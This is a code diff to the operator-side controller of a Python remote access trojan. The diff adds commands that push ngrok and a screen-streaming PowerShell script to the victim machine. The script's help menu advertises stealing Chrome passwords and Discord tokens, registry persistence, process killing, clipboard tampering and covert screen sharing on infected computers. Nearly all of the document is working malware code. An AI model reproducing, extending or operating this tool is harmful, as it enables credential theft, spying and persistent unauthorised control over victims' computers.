@@ -3,12 +3,13 @@ import  requests
 import json
 import os
 import threading
+from os.path import isfile
 
 f = open('serverport.txt', 'r').read()
 if f == "{}" or "":
     serverport = input('entre serverport:')
     with open('serverport.txt', 'w') as port:
-        port.write('4444')
+        port.write(serverport)
 
 
 def replace_string(filename, old_string, new_string):
@@ -98,6 +99,7 @@ def build():
 
 
 
+
 def banner():
     print("""
      ___  _______  ______    _______  _______  __   __  _______ 
@@ -129,8 +131,12 @@ def reliable_send(target, data):
 
 
 def upload_file(target, file_name):
-    f = open(file_name, 'rb')
-    target.send(f.read())
+    if isfile(file_name) == True:
+        f = open(file_name, 'rb')
+        target.send(f.read())
+    else:
+        print('didn t find the file')
+
 
 
 def download_file(target, file_name):
@@ -158,9 +164,11 @@ def target_communication(target, ip):
         elif command == 'back':
             break
         elif command == 'clear':
-            os.system('clear')
+            os.system('cls')
         elif command[:6] == 'upload':
             upload_file(target, command[7:])
+        elif command == 'ngroksetup':
+            upload_file(target,'scripts\\ngrok.exe')
         elif command[:8] == 'download':
             download_file(target, command[9:])
         elif command[:10] == 'screenshot':
@@ -195,10 +203,19 @@ def target_communication(target, ip):
             chrome_recon                       --> recover Chrome Passwords
             disteal                            --> Get Discord tokens
             priv                               --> Check User Priv
-            scan-arp                           --> scan connected users in the client network
-            say                                --> make Target Computer talk ex: say something | 0=male or 1=female
+            sysinfo                            --> get system information
+            say                                --> make Target Computer talk ex: say something
             clip                               --> change data in clipoard
-            persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
+            pslist                             --> print the running process on the client
+            kill                               --> kill running process with pid example:kill 1009
+            screenshare                        --> stream client screen
+            ssharescreen                       --> stopstreaming
+            ngroksetup                         --> download ngrok on the client
+            changepolicy                       --> execute powershell scripts
+            persistence *RegName* *fileName*   --> Create Persistence In Registry'''))
+        elif command[:11] == 'screenshare':
+            upload_file(target,'scripts\\screenshare.ps1')
+
         else:
             result = reliable_recv(target)
             print(result)
@@ -263,7 +280,6 @@ while True:
     kill            --> kill session
     rmlist          --> remove disconnected target from list
     clear           --> clear the screen
-    build           --> build payload
             """)
     elif command == 'banner':
         banner()
